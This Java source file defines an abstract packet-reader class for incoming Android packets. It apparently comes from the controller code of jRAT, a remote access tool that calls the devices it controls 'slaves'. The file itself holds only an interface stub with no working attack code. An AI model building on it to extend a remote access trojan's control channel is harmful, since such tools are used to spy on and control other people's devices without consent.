package jrat.controller.packets.android.incoming;

import jrat.controller.android.AndroidSlave;

import java.io.DataInputStream;


public abstract class AbstractIncomingAndroidPacket {

	public abstract void read(AndroidSlave slave, DataInputStream dis) throws Exception;

}
